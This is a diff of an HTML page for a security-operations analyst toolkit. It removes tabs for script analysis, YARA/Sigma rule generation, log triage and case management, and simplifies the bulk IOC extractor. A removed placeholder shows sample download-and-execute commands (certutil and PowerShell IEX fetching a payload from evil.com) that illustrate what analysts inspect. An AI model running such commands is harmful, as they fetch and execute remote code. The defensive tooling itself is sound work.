-          <label><input type="checkbox" value="T1071"> T1071 – Application Layer Protocol</label>
-          <label><input type="checkbox" value="T1095"> T1095 – Non-Application Layer Protocol</label>
-          <label><input type="checkbox" value="T1105"> T1105 – Ingress Tool Transfer</label>
-          <label><input type="checkbox" value="T1041"> T1041 – Exfiltration Over C2 Channel</label>
-          <label><input type="checkbox" value="T1567"> T1567 – Exfiltration Over Web Service</label>
-          <label><input type="checkbox" value="T1486"> T1486 – Data Encrypted for Impact (Ransomware)</label>
-          <label><input type="checkbox" value="T1489"> T1489 – Service Stop</label>
-        </div>
-        <div style="padding:8px 14px 14px; display:flex; gap:10px; flex-wrap:wrap;">
-          <button id="mitre-copy-btn" type="button" style="font-size:12px; padding:7px 12px;">📋 Copy Tagged TTPs</button>
-          <button id="mitre-clear-btn" type="button" style="font-size:12px; padding:7px 12px;">🗑 Clear Tags</button>
-          <a id="mitre-attack-link" href="https://attack.mitre.org/" target="_blank" style="font-size:12px; padding:7px 12px; border:1px solid rgba(56,189,248,0.25); background:linear-gradient(180deg,rgba(56,189,248,0.18),rgba(56,189,248,0.08)); color:var(--text); border-radius:12px; text-decoration:none; font-weight:700;">🔗 Open in ATT&CK Navigator</a>
-        </div>
-      </div>
-    </div><!-- end tab-single -->
-
-    <!-- ===== BULK IOC TAB ===== -->
-    <div id="tab-bulk" class="tab-panel">
+    <section id="tab-bulk" class="tab-panel">
       <div class="input-panel">
-        <div class="bulk-header">
-          <h3>📋 Bulk IOC Analyzer</h3>
-          <p class="sub">Paste a list of IOCs (IPs, domains, hashes, CVEs, emails — one per line or mixed). The tool will extract, classify, and generate pivot links for all of them.</p>
+        <div class="bulk-head">
+          <h2>📋 Bulk IOC Extractor</h2>
+          <div class="subtle">Paste logs, headers, alerts, or notes.</div>
         </div>
-        <textarea id="bulk-input" placeholder="Paste IOCs here — one per line or mixed text.&#10;192.168.1.1&#10;malware.example.com&#10;44d88612fea8a8f36de82e1278abb02f&#10;CVE-2021-44228&#10;attacker@evil.com"></textarea>
-        <div class="tools" style="margin-top:10px;">
-          <button id="bulk-analyze-btn" type="button">🔍 Analyze All IOCs</button>
-          <button id="bulk-clear-btn" type="button">🗑 Clear</button>
-          <button id="bulk-copy-btn" type="button">📋 Copy Results</button>
-          <button id="bulk-add-case-btn" type="button">📁 Add All to Case</button>
+        <textarea id="bulk-input" class="bulk-input" placeholder="Paste raw text here..."></textarea>
+        <div class="tools">
+          <button id="bulk-extract-btn" type="button">Extract</button>
+          <button id="bulk-copy-btn" type="button">Copy Results</button>
+          <button id="bulk-clear-btn" type="button">Clear</button>
         </div>
-        <div id="bulk-status" class="status" style="margin-top:10px;">
-          <span>Paste IOCs above and click Analyze</span><span class="badge">BULK</span>
-        </div>
+        <textarea id="bulk-output" class="bulk-output" placeholder="Extracted IOCs will appear here"></textarea>
       </div>
-      <div id="bulk-results" class="bulk-results"></div>
-    </div>
-
-    <!-- ===== SCRIPT ANALYZER TAB ===== -->
-    <div id="tab-script" class="tab-panel">
-      <div class="sa-mode-bar">
-        <button class="sa-mode-btn active" data-mode="powershell" type="button">⚡ PowerShell</button>
-        <button class="sa-mode-btn" data-mode="cmdline" type="button">🖥 Command Line</button>
-        <button class="sa-mode-btn" data-mode="bash" type="button">🐧 Bash / Shell</button>
-        <button class="sa-mode-btn" data-mode="vbs" type="button">📜 VBScript / WSH</button>
-        <button class="sa-mode-btn" data-mode="js" type="button">🌐 JS / JScript</button>
-        <button class="sa-mode-btn" data-mode="auto" type="button">🤖 Auto-Detect</button>
-      </div>
-      <div class="input-panel" style="margin-top:12px;">
-        <div class="sa-input-header">
-          <div>
-            <h3 style="margin:0 0 4px;font-size:15px;">⚡ Script / Command Analyzer</h3>
-            <p style="margin:0;font-size:12px;color:var(--muted);">Paste any PowerShell, CMD, Bash, VBScript, or JS snippet — the analyzer will decode, flag threats, map MITRE TTPs, and extract IOCs.</p>
-          </div>
-          <div class="sa-actions">
-            <button id="sa-analyze-btn" type="button">🔍 Analyze</button>
-            <button id="sa-clear-btn" type="button">🗑 Clear</button>
-            <button id="sa-copy-btn" type="button">📋 Copy Report</button>
-            <button id="sa-decode-btn" type="button" title="Attempt to decode all Base64 layers">🔓 Deep Decode</button>
-            <button id="sa-yara-btn" type="button" title="Generate YARA rule from IOCs">📜 Gen YARA</button>
-            <button id="sa-sigma-btn" type="button" title="Generate Sigma rule skeleton">⚡ Gen Sigma</button>
-          </div>
-        </div>
-        <textarea id="sa-input" spellcheck="false" autocomplete="off"
-          placeholder="Paste PowerShell, CMD, Bash, VBScript, JScript or any command-line snippet here...&#10;&#10;Examples:&#10;  powershell -enc JABjACAAPQAgACcA...&#10;  cmd /c certutil -urlcache -f http://evil.com/pay.exe&#10;  IEX (New-Object Net.WebClient).DownloadString('http://...')"></textarea>
-        <div id="sa-status" class="status" style="margin-top:10px;">
-          <span>Paste a script above and click Analyze</span>
-          <span class="badge" id="sa-mode-badge">POWERSHELL</span>
-        </div>
-      </div>
-      <div id="sa-results" class="sa-results"></div>
-    </div>
-
-    <!-- ===== ALERT WRITE-UP TAB ===== -->
-    <div id="tab-writeup" class="tab-panel">
-      <div class="aw-layout">
-        <div class="aw-sidebar">
-          <div class="aw-sidebar-head">🛡 Alert Templates</div>
-          <div class="aw-platform-bar">
-            <button class="aw-plat-btn active" data-plat="all" type="button">All</button>
-            <button class="aw-plat-btn" data-plat="crowdstrike" type="button">CrowdStrike</button>
-            <button class="aw-plat-btn" data-plat="sentinel" type="button">Sentinel</button>
-            <button class="aw-plat-btn" data-plat="splunk" type="button">Splunk</button>
-            <button class="aw-plat-btn" data-plat="defender" type="button">Defender</button>
-            <button class="aw-plat-btn" data-plat="generic" type="button">Generic SOC</button>
-          </div>
-          <div id="aw-template-list" class="aw-template-list"></div>
-        </div>
-        <div class="aw-main">
-          <div id="aw-template-info" class="aw-template-info">
-            <div class="aw-ti-head">
-              <span id="aw-ti-icon">📋</span>
-              <div>
-                <div id="aw-ti-name" style="font-weight:800;font-size:15px;">Select a template</div>
-                <div id="aw-ti-plat" style="font-size:11px;color:var(--muted);margin-top:2px;"></div>
-              </div>
-              <div id="aw-ti-mitre" class="aw-ti-mitre"></div>
-            </div>
-            <div id="aw-ti-desc" style="font-size:12px;color:var(--muted);margin-top:8px;line-height:1.6;"></div>
-          </div>
-          <div id="aw-form" class="aw-form">
-            <div class="aw-form-placeholder">← Pick an alert template to begin</div>
-          </div>
-          <div class="aw-action-bar" id="aw-action-bar" style="display:none">
-            <div class="aw-output-tabs">
-              <button class="aw-out-tab active" data-out="structured" type="button">📄 Full Report</button>
-              <button class="aw-out-tab" data-out="ticket" type="button">🎫 Ticket</button>
-              <button class="aw-out-tab" data-out="exec" type="button">👔 Exec Summary</button>
-            </div>
-            <div class="aw-btns">
-              <button id="aw-generate-btn" type="button">⚡ Generate</button>
-              <button id="aw-copy-btn" type="button">📋 Copy</button>
-              <button id="aw-clear-btn" type="button">🗑 Clear</button>
-            </div>
-          </div>
-          <div id="aw-output" class="aw-output" style="display:none">
-            <pre id="aw-output-text"></pre>
-          </div>
-        </div>
-      </div>
-    </div>
-
-    <!-- ===== CASE MANAGER TAB ===== -->
-    <div id="tab-case" class="tab-panel">
-      <div class="input-panel">
-        <div class="bulk-header">
-          <h3>📁 Case / Investigation Manager</h3>
-          <p class="sub">Organize IOCs into named investigations. Add notes, set status, and export full case reports.</p>
-        </div>
-        <div class="case-controls">
-          <input id="case-name-input" type="text" class="aw-input" placeholder="Case name (e.g. INC-2025-042 – Phishing Campaign)" style="flex:1" />
-          <button id="case-new-btn" type="button">➕ New Case</button>
-          <button id="case-export-btn" type="button">📤 Export Case</button>
-          <button id="case-stix-btn" type="button" title="Export as STIX 2.1 JSON bundle for threat intel sharing">📦 STIX 2.1</button>
-          <button id="case-clear-btn" type="button">🗑 Clear Case</button>
-        </div>
-        <div id="case-status" class="status" style="margin-top:10px;">
-          <span>No active case. Create one above.</span><span class="badge">CASE</span>
-        </div>
-      </div>
-      <div id="case-body" class="case-body"></div>
-    </div>
-
-    <!-- ===== TIMELINE TAB ===== -->
-    <div id="tab-timeline" class="tab-panel">
-      <div class="input-panel">
-        <div class="bulk-header">
-          <h3>⏱ Attack Timeline Builder</h3>
-          <p class="sub">Plot investigation events chronologically. Add events, reorder them, and export the full timeline for tickets or reports.</p>
-        </div>
-        <div class="timeline-controls">
-          <input id="tl-time-input" type="datetime-local" class="aw-input" style="flex:1" />
-          <input id="tl-event-input" type="text" class="aw-input" placeholder="Event description (e.g. Phishing email received by user@corp.com)" style="flex:2" />
-          <select id="tl-type-select" class="aw-input" style="flex:0.5">
-            <option value="initial">🔴 Initial Access</option>
-            <option value="execution">🟠 Execution</option>
-            <option value="persistence">🟡 Persistence</option>
-            <option value="lateral">🔵 Lateral Movement</option>
-            <option value="exfil">🟣 Exfiltration</option>
-            <option value="discovery">🟢 Discovery</option>
-            <option value="impact">⚫ Impact</option>
-            <option value="other">⚪ Other</option>
-          </select>
-          <button id="tl-add-btn" type="button">➕ Add Event</button>
-        </div>
-        <div class="tools" style="margin-top:10px;">
-          <button id="tl-export-btn" type="button">📤 Export Timeline</button>
-          <button id="tl-clear-btn" type="button">🗑 Clear</button>
-        </div>
-      </div>
-      <div id="timeline-body" class="timeline-body"></div>
-    </div>
-
-    <!-- ===== HASH FILE TAB ===== -->
-    <div id="tab-hashfile" class="tab-panel">
-      <div class="input-panel">
-        <div class="bulk-header">
-          <h3>🔑 Hash File (Client-Side)</h3>
-          <p class="sub">Drag &amp; drop or select a file to compute MD5 / SHA-1 / SHA-256 locally in your browser. <strong>No file is uploaded anywhere.</strong> Hash is then auto-pivoted to all threat intel tools.</p>
-        </div>
-        <div id="hash-dropzone" class="hash-dropzone">
-          <div class="hash-drop-inner">
-            <div style="font-size:3rem">📂</div>
-            <div style="font-weight:700;font-size:15px;margin:8px 0 4px">Drop file here or click to select</div>
-            <div style="font-size:12px;color:var(--muted)">File never leaves your browser — hashes computed locally</div>
-            <input id="hash-file-input" type="file" style="display:none" />
-          </div>
-        </div>
-        <div id="hash-results" class="hash-results" style="display:none"></div>
-      </div>
-    </div>
-
-    <!-- ===== DEFANG / REFANG BULK TAB ===== -->
-    <div id="tab-defangbulk" class="tab-panel">
-      <div class="input-panel">
-        <div class="bulk-header">
-          <h3>🛡 Bulk Defang / Refang</h3>
-          <p class="sub">Paste any report, email body, or IOC list. Get a clean defanged or refanged version with a diff view showing every change made.</p>
-        </div>
-        <div class="defang-layout">
-          <div class="defang-pane">
-            <div class="defang-pane-head">📥 Input</div>
-            <textarea id="dfb-input" spellcheck="false" placeholder="Paste text, IOCs, or full report here..."></textarea>
-          </div>
-          <div class="defang-pane">
-            <div class="defang-pane-head">📤 Output</div>
-            <textarea id="dfb-output" spellcheck="false" readonly placeholder="Result will appear here..."></textarea>
-          </div>
-        </div>
-        <div class="tools" style="margin-top:12px;">
-          <button id="dfb-defang-btn" type="button">🛡 Defang All</button>
-          <button id="dfb-refang-btn" type="button">🔓 Refang All</button>
-          <button id="dfb-copy-btn" type="button">📋 Copy Output</button>
-          <button id="dfb-clear-btn" type="button">🗑 Clear</button>
-        </div>
-        <div id="dfb-diff" class="dfb-diff" style="display:none"></div>
-      </div>
-    </div>
-
-    <!-- ===== YARA / SIGMA TAB ===== -->
-    <div id="tab-yara" class="tab-panel">
-      <div class="input-panel">
-        <div class="bulk-header">
-          <h3>📜 YARA &amp; Sigma Rule Generator</h3>
-          <p class="sub">Generate YARA rule skeletons from hashes / strings, and Sigma rule YAML from IOC types and MITRE TTPs. Edit and export for use in your SIEM or AV platform.</p>
-        </div>
-        <div class="yara-tabs">
-          <button class="yara-tab-btn active" data-ytab="yara" type="button">📜 YARA Rule</button>
-          <button class="yara-tab-btn" data-ytab="sigma" type="button">⚡ Sigma Rule</button>
-        </div>
-
-        <!-- YARA Panel -->
-        <div id="yara-panel" class="yara-panel">
-          <div class="yara-form">
-            <input id="yara-rulename" class="aw-input" type="text" placeholder="Rule name (e.g. MAL_Cobalt_Strike_Beacon)" />
-            <input id="yara-author" class="aw-input" type="text" placeholder="Author" />
-            <input id="yara-hashes" class="aw-input" type="text" placeholder="Hashes (comma-separated MD5/SHA256)" />
-            <input id="yara-strings" class="aw-input" type="text" placeholder='Suspicious strings (comma-separated, e.g. "MZ\x90","/c powershell")' />
-            <input id="yara-urls" class="aw-input" type="text" placeholder="C2 URLs / domains (comma-separated)" />
-            <textarea id="yara-notes" class="aw-input aw-textarea" rows="2" placeholder="Description / notes..."></textarea>
-          </div>
-          <div class="tools" style="margin-top:10px;">
-            <button id="yara-gen-btn" type="button">⚡ Generate YARA</button>
-            <button id="yara-copy-btn" type="button">📋 Copy</button>
-            <button id="yara-clear-btn" type="button">🗑 Clear</button>
-          </div>
-          <pre id="yara-output" class="rule-output" style="display:none"></pre>
-        </div>
-
-        <!-- Sigma Panel -->
-        <div id="sigma-panel" class="yara-panel" style="display:none">
-          <div class="yara-form">
-            <input id="sigma-title" class="aw-input" type="text" placeholder="Rule title (e.g. Suspicious PowerShell Encoded Command)" />
-            <input id="sigma-author" class="aw-input" type="text" placeholder="Author" />
-            <select id="sigma-logsource" class="aw-input">
-              <option value="windows_process">Windows Process Creation</option>
-              <option value="windows_security">Windows Security Event Log</option>
-              <option value="windows_powershell">Windows PowerShell</option>
-              <option value="windows_sysmon">Sysmon</option>
-              <option value="proxy">Web Proxy</option>
-              <option value="firewall">Firewall</option>
-              <option value="linux_auditd">Linux auditd</option>
-            </select>
-            <input id="sigma-ioc" class="aw-input" type="text" placeholder="Key IOC / detection value (e.g. -EncodedCommand, powershell.exe)" />
-            <input id="sigma-mitre" class="aw-input" type="text" placeholder="MITRE TTP(s) (e.g. T1059.001, T1027)" />
-            <select id="sigma-level" class="aw-input">
-              <option value="critical">critical</option>
-              <option value="high" selected>high</option>
-              <option value="medium">medium</option>
-              <option value="low">low</option>
-            </select>
-          </div>
-          <div class="tools" style="margin-top:10px;">
-            <button id="sigma-gen-btn" type="button">⚡ Generate Sigma</button>
-            <button id="sigma-copy-btn" type="button">📋 Copy</button>
-            <button id="sigma-uncoder-btn" type="button">🔗 Open Uncoder.io</button>
-            <button id="sigma-clear-btn" type="button">🗑 Clear</button>
-          </div>
-          <pre id="sigma-output" class="rule-output" style="display:none"></pre>
-        </div>
-      </div>
-    </div>
-
-    <!-- ===== LOG TRIAGE TAB ===== -->
-    <div id="tab-logtriage" class="tab-panel">
-      <div class="input-panel">
-        <div class="bulk-header">
-          <h3>🧾 Log / Alert Auto-Triage</h3>
-          <p class="sub">Paste a raw SIEM alert, Windows Event Log block, firewall log, or any security log. The tool parses it, extracts all IOCs, identifies event types, and pre-fills the Alert Write-up form.</p>
-        </div>
-        <textarea id="lt-input" spellcheck="false" placeholder="Paste raw SIEM alert, Windows Event Log, firewall log, email header, or any security event here...&#10;&#10;Examples:&#10;  EventID: 4688 — A new process has been created...&#10;  SRC=192.168.1.5 DST=10.0.0.1 PROTO=TCP DPT=443...&#10;  Authentication-Results: spf=fail; dkim=pass..."></textarea>
-        <div class="tools" style="margin-top:10px;">
-          <button id="lt-analyze-btn" type="button">🔍 Auto-Triage</button>
-          <button id="lt-prefill-btn" type="button">📝 Pre-fill Write-up</button>
-          <button id="lt-copy-btn" type="button">📋 Copy Results</button>
-          <button id="lt-casenotes-btn" type="button" title="Copy structured case notes">📝 Copy Case Notes</button>
-          <button id="lt-soc-note-btn" type="button" title="Generate full SOC prose case note" style="background:linear-gradient(135deg,#1D9E75,#0ea5e9);color:#fff;border:none;font-weight:800;">✍️ Generate SOC Note</button>
-          <button id="lt-addall-btn" type="button" title="Add all extracted IOCs to the active case">📁 Add All to Case</button>
-          <button id="lt-clear-btn" type="button">🗑 Clear</button>
-        </div>
-        <!-- SOC Note Generator Controls -->
-        <div id="lt-soc-note-controls" style="display:none;margin-top:10px;padding:12px;background:var(--bg2);border:1px solid var(--border);border-radius:10px;">
-          <div style="font-size:11px;font-weight:800;color:var(--text);margin-bottom:8px;">✍️ SOC Case Note Generator</div>
-          <div style="display:flex;gap:8px;flex-wrap:wrap;align-items:center;">
-            <input id="lt-soc-analyst" class="aw-input" placeholder="Analyst name" style="flex:1;min-width:120px;font-size:11px;"/>
-            <select id="lt-soc-verdict" class="aw-input" style="flex:1;min-width:130px;font-size:11px;">
-              <option value="TP_blocked">TP – Blocked</option>
-              <option value="TP_detected">TP – Detected (not blocked)</option>
-              <option value="TP_confirmed">TP – Confirmed Compromise</option>
-              <option value="FP">FP – False Positive</option>
-              <option value="BEN">Benign – Expected Activity</option>
-              <option value="TBD">TBD – Under Investigation</option>
-            </select>
-            <select id="lt-soc-disposition" class="aw-input" style="flex:1;min-width:130px;font-size:11px;">
-              <option value="NFA">No Further Action (NFA)</option>
-              <option value="escalated">Escalated to Tier 2 / IR</option>
-              <option value="contained">Contained – Endpoint Isolated</option>
-              <option value="monitoring">Continue Monitoring</option>
-              <option value="remediated">Remediated</option>
-              <option value="user_notified">User Notified</option>
-            </select>
-            <button id="lt-soc-generate-btn" type="button" style="background:linear-gradient(135deg,#1D9E75,#0ea5e9);color:#fff;border:none;font-weight:800;padding:6px 16px;border-radius:8px;font-size:11px;cursor:pointer;">⚡ Generate</button>
-          </div>
-          <textarea id="lt-soc-extra-context" spellcheck="false" rows="2" placeholder="Optional: add any extra context the auto-analysis may have missed (e.g. 'user confirmed they visited the site', 'ticket #INC-1234')" style="margin-top:8px;width:100%;font-size:11px;background:var(--bg);border:1px solid var(--border);border-radius:8px;color:var(--text);padding:8px;font-family:inherit;resize:vertical;"></textarea>
-        </div>
-        </div>
-        <div id="lt-status" class="status" style="margin-top:10px;">
-          <span>Paste a log or alert above and click Auto-Triage</span><span class="badge">TRIAGE</span>
-        </div>
-      </div>
-      <div id="lt-results" class="sa-results"></div>
-      <!-- SOC Case Note Output Panel -->
-      <div id="lt-soc-note-panel" style="display:none;margin-top:14px;">
-        <div style="background:var(--bg2);border:1px solid rgba(29,158,117,0.35);border-radius:12px;overflow:hidden;">
-          <div style="display:flex;align-items:center;gap:10px;padding:11px 16px 10px;border-bottom:1px solid var(--border);background:rgba(29,158,117,0.06);">
-            <span style="font-size:14px;">✍️</span>
-            <span style="font-size:12px;font-weight:800;color:var(--text);">SOC Case Note</span>
-            <span style="font-size:10px;color:var(--muted);flex:1;">Analyst-grade prose — ready to paste into your ticketing system</span>
-            <button id="lt-soc-copy-btn" type="button" style="font-size:10px;padding:3px 10px;border-radius:6px;border:1px solid var(--border);background:transparent;color:var(--muted);cursor:pointer;">📋 Copy</button>
-            <button id="lt-soc-addcase-btn" type="button" style="font-size:10px;padding:3px 10px;border-radius:6px;border:1px solid var(--border);background:transparent;color:var(--muted);cursor:pointer;">📁 Add to Case</button>
-          </div>
-          <div id="lt-soc-note-body" style="padding:16px;font-size:12px;line-height:1.9;color:var(--text);white-space:pre-wrap;font-family:inherit;"></div>
-        </div>
-      </div>
-    </div>
-
-    <!-- ===== THREAT ACTOR TAB ===== -->
-    <div id="tab-threat" class="tab-panel">
-      <div class="input-panel">
-        <div class="bulk-header">
-          <h3>🕵 Threat Actor / Campaign Lookup</h3>
-          <p class="sub">Search by actor name (APT29, Lazarus, etc.) or campaign keyword. Get MITRE ATT&amp;CK group page, known TTPs, tools used, and external intelligence pivot links.</p>
-        </div>
-        <div class="input-row">
-          <input id="ta-input" type="text" class="aw-input" placeholder="Actor name, alias, or campaign (e.g. APT29, Lazarus, Cozy Bear, FIN7)" style="flex:1" />
-          <button id="ta-search-btn" type="button">🔍 Search</button>
-        </div>
-        <div id="ta-status" class="status" style="margin-top:10px;">
-          <span>Enter an actor or campaign name above</span><span class="badge">THREAT INTEL</span>
-        </div>
-      </div>
-      <div id="ta-results" class="ta-results"></div>
-    </div>
-
-    <!-- ===== CUSTOM TOOLS TAB ===== -->
-    <div id="tab-custom" class="tab-panel">
-      <div class="input-panel">
-        <div class="bulk-header">
-          <h3>⚙ Custom Tool Slot Builder</h3>
-          <p class="sub">Add your own org-internal tools, SIEM dashboards, or ticketing systems. Use <code>{IOC}</code> as a placeholder for the search value.</p>
-        </div>
-        <div class="custom-tool-form">
-          <input id="ct-name" class="aw-input" type="text" placeholder="Tool name (e.g. Internal SIEM)" />
-          <input id="ct-icon" class="aw-input" type="text" placeholder="Emoji icon (e.g. 🏢)" style="max-width:90px" />
-          <select id="ct-type" class="aw-input" style="max-width:130px">
-            <option value="all">All IOC types</option>
-            <option value="ip">IP only</option>
-            <option value="domain">Domain only</option>
-            <option value="hash">Hash only</option>
-            <option value="url">URL only</option>
-            <option value="email">Email only</option>
-          </select>
-          <input id="ct-url" class="aw-input" type="text" placeholder="URL template — use {IOC} as placeholder (e.g. https://siem.corp/search?q={IOC})" style="flex:2" />
-          <button id="ct-add-btn" type="button">➕ Add Tool</button>
-        </div>
-        <div id="ct-status" class="status" style="margin-top:10px;">
-          <span>Add custom tools above — they appear in Single IOC search results</span><span class="badge">CUSTOM</span>
-        </div>
-      </div>
-      <div id="ct-list" class="ct-list"></div>
-    </div>
-
-    <!-- ===== SOC UTILITIES TAB ===== -->
-    <div id="tab-utils" class="tab-panel">
-      <div class="utils-grid">
-
-        <!-- Quick Base64 Encode/Decode -->
-        <div class="utils-card">
-          <div class="utils-card-head">🔓 Quick Base64 Decode / Encode</div>
-          <textarea id="util-b64-input" spellcheck="false" placeholder="Paste Base64 to decode, or plain text to encode..."></textarea>
-          <div class="utils-actions">
-            <button id="util-b64-decode" type="button">🔓 Decode</button>
-            <button id="util-b64-encode" type="button">🔒 Encode</button>
-            <button id="util-b64-deep" type="button" title="Recursively decode multiple layers">🔁 Deep Decode</button>
-            <button id="util-b64-copy" type="button">📋 Copy</button>
-            <button id="util-b64-pivot" type="button" title="Send decoded result to Single IOC search">🔍 Pivot</button>
-          </div>
-          <textarea id="util-b64-output" spellcheck="false" readonly placeholder="Result..."></textarea>
-        </div>
-
-        <!-- URL Decoder / Encoder -->
-        <div class="utils-card">
-          <div class="utils-card-head">🔗 URL Decode / Encode</div>
-          <textarea id="util-url-input" spellcheck="false" placeholder="Paste URL-encoded string or plain text..."></textarea>
-          <div class="utils-actions">
-            <button id="util-url-decode" type="button">🔓 URL Decode</button>
-            <button id="util-url-encode" type="button">🔒 URL Encode</button>
-            <button id="util-url-double-decode" type="button">🔁 Double Decode</button>
-            <button id="util-url-copy" type="button">📋 Copy</button>
-          </div>
-          <textarea id="util-url-output" spellcheck="false" readonly placeholder="Result..."></textarea>
-        </div>
-
-        <!-- Regex IOC Hunter -->
-        <div class="utils-card utils-card-wide">
-          <div class="utils-card-head">🎯 Regex IOC Hunter</div>
-          <div class="regex-hunter-layout">
-            <div class="regex-hunter-left">
-              <textarea id="util-regex-input" spellcheck="false" placeholder="Paste any text — threat report, alert, email body, log..."></textarea>
-              <div class="utils-actions">
-                <button id="util-regex-run" type="button">🔍 Extract All IOCs</button>
-                <button id="util-regex-copy" type="button">📋 Copy IOCs</button>
-                <button id="util-regex-clear" type="button">🗑 Clear</button>
-                <button id="util-regex-bulk" type="button">📋 Send to Bulk Analyzer</button>
-              </div>
-            </div>
-            <div id="util-regex-results" class="regex-results"></div>
-          </div>
-        </div>
-
-        <!-- IOC Normalizer / Defang Detector -->
-        <div class="utils-card">
-          <div class="utils-card-head">🧹 IOC Normalizer</div>
-          <p class="utils-card-desc">Normalizes any defanged/mixed IOC: strips hxxp, [.], (@), brackets, trailing punctuation. One IOC per line.</p>
-          <textarea id="util-norm-input" spellcheck="false" placeholder="hxxps://evil[.]com&#10;192[.]168[.]1[.]1&#10;user[@]domain.com&#10;44d88612fea8a8f36de82e1278abb02f"></textarea>
-          <div class="utils-actions">
-            <button id="util-norm-run" type="button">🧹 Normalize</button>
-            <button id="util-norm-copy" type="button">📋 Copy</button>
-            <button id="util-norm-pivot" type="button">📤 Send to Bulk</button>
-            <button id="util-norm-clear" type="button">🗑 Clear</button>
-          </div>
-          <textarea id="util-norm-output" spellcheck="false" readonly placeholder="Normalized output..."></textarea>
-        </div>
-
-        <!-- Hex / Octal Decoder -->
-        <div class="utils-card">
-          <div class="utils-card-head">🔢 Hex / Octal / Char Decoder</div>
-          <textarea id="util-hex-input" spellcheck="false" placeholder="Examples:&#10;\x68\x65\x6c&#10;0x48 0x65 0x6c&#10;72 101 108"></textarea>
-          <div class="utils-actions">
-            <button id="util-hex-decode-hex" type="button">HEX → Text</button>
-            <button id="util-hex-decode-oct" type="button">OCT → Text</button>
-            <button id="util-hex-decode-dec" type="button">DEC → Text</button>
-            <button id="util-hex-copy" type="button">📋 Copy</button>
-          </div>
-          <textarea id="util-hex-output" spellcheck="false" readonly placeholder="Decoded text..."></textarea>
-        </div>
-
-        <!-- Epoch / Timestamp Converter -->
-        <div class="utils-card">
-          <div class="utils-card-head">⏱ Timestamp Converter</div>
-          <p class="utils-card-desc">Convert Unix epoch ↔ human-readable date. Supports seconds, milliseconds, and ISO 8601.</p>
-          <input id="util-ts-input" class="aw-input" type="text" placeholder="e.g. 1714000000 or 2024-04-25T00:00:00Z" />
-          <div class="utils-actions" style="margin-top:8px">
-            <button id="util-ts-todate" type="button">🕒 Epoch → Date</button>
-            <button id="util-ts-toepoch" type="button">🔢 Date → Epoch</button>
-            <button id="util-ts-now" type="button">📍 Now</button>
-            <button id="util-ts-copy" type="button">📋 Copy</button>
-          </div>
-          <div id="util-ts-output" class="utils-output-box"></div>
-        </div>
-
-        <!-- Hash Calculator (text input) -->
-        <div class="utils-card">
-          <div class="utils-card-head">🔑 Text Hasher</div>
-          <p class="utils-card-desc">Hash any text string (useful for indicator comparison, password checks, or signature generation).</p>
-          <textarea id="util-hash-input" spellcheck="false" placeholder="Enter text to hash..." rows="3"></textarea>
-          <div class="utils-actions">
-            <button id="util-hash-run" type="button">⚡ Hash It</button>
-            <button id="util-hash-copy" type="button">📋 Copy SHA256</button>
-            <button id="util-hash-pivot" type="button">🔍 Pivot SHA256</button>
-          </div>
-          <div id="util-hash-output" class="utils-output-box"></div>
-        </div>
-
-        <!-- Analyst Scratchpad -->
-        <div class="utils-card utils-card-wide">
-          <div class="utils-card-head">📝 Analyst Scratchpad <span style="font-size:10px;color:var(--muted);font-weight:400;margin-left:8px">— auto-saved to browser storage</span></div>
-          <textarea id="util-notes" spellcheck="false" placeholder="Use this as a working notepad during investigations. Notes auto-save every keystroke...&#10;&#10;Tip: Use <!-- CASE-001 --> markers to organize findings."></textarea>
-          <div class="utils-actions">
-            <button id="util-notes-copy" type="button">📋 Copy Notes</button>
-            <button id="util-notes-export" type="button">📤 Export .txt</button>
-            <button id="util-notes-clear" type="button">🗑 Clear Notes</button>
-          </div>
-          <div class="utils-note-count"><span id="util-notes-chars">0</span> chars · <span id="util-notes-words">0</span> words</div>
-        </div>
-
-        <!-- String Reverse / ROT13 / Caesar -->
-        <div class="utils-card">
-          <div class="utils-card-head">🔄 String Transforms</div>
-          <textarea id="util-str-input" spellcheck="false" placeholder="Enter text to transform..."></textarea>
-          <div class="utils-actions">
-            <button id="util-str-reverse" type="button">↩ Reverse</button>
-            <button id="util-str-rot13" type="button">🔄 ROT13</button>
-            <button id="util-str-upper" type="button">▲ Upper</button>
-            <button id="util-str-lower" type="button">▼ Lower</button>
-            <button id="util-str-hex" type="button">HEX</button>
-            <button id="util-str-copy" type="button">📋 Copy</button>
-          </div>
-          <textarea id="util-str-output" spellcheck="false" readonly placeholder="Result..."></textarea>
-        </div>
-
-        <!-- JWT Decoder -->
-        <div class="utils-card">
-          <div class="utils-card-head">🪙 JWT Decoder</div>
-          <p class="utils-card-desc">Decode a JWT token (header + payload). Validates structure only — does not verify signature.</p>
-          <textarea id="util-jwt-input" spellcheck="false" placeholder="Paste JWT token: eyJhbGc..." rows="3"></textarea>
-          <div class="utils-actions">
-            <button id="util-jwt-decode" type="button">🔓 Decode JWT</button>
-            <button id="util-jwt-copy" type="button">📋 Copy</button>
-          </div>
-          <pre id="util-jwt-output" class="utils-output-box" style="white-space:pre-wrap;word-break:break-all;font-size:11px;"></pre>
-        </div>
-
-        <!-- Whois quick reference -->
-        <div class="utils-card">
-          <div class="utils-card-head">📡 Quick Pivot Launcher</div>
-          <p class="utils-card-desc">Daily-use intelligence links. Opens in a new tab — no IOC needed.</p>
-          <div class="quicklinks-grid">
-            <a href="https://www.virustotal.com/" target="_blank" class="quicklink-btn">🧪 VirusTotal</a>
-            <a href="https://urlscan.io/" target="_blank" class="quicklink-btn">🔎 URLScan</a>
-            <a href="https://bazaar.abuse.ch/" target="_blank" class="quicklink-btn">🦠 MalwareBazaar</a>
-            <a href="https://threatfox.abuse.ch/" target="_blank" class="quicklink-btn">🦊 ThreatFox</a>
-            <a href="https://any.run/" target="_blank" class="quicklink-btn">🏃 AnyRun</a>
-            <a href="https://www.hybrid-analysis.com/" target="_blank" class="quicklink-btn">🧫 Hybrid Analysis</a>
-            <a href="https://attack.mitre.org/" target="_blank" class="quicklink-btn">🧩 ATT&CK</a>
-            <a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog" target="_blank" class="quicklink-btn">🧨 CISA KEV</a>
-            <a href="https://otx.alienvault.com/" target="_blank" class="quicklink-btn">👽 OTX</a>
-            <a href="https://viz.greynoise.io/" target="_blank" class="quicklink-btn">🌫 GreyNoise</a>
-            <a href="https://search.censys.io/" target="_blank" class="quicklink-btn">🔭 Censys</a>
-            <a href="https://www.shodan.io/" target="_blank" class="quicklink-btn">🛰 Shodan</a>
-            <a href="https://intelx.io/" target="_blank" class="quicklink-btn">📡 IntelX</a>
-            <a href="https://haveibeenpwned.com/" target="_blank" class="quicklink-btn">🧨 HIBP</a>
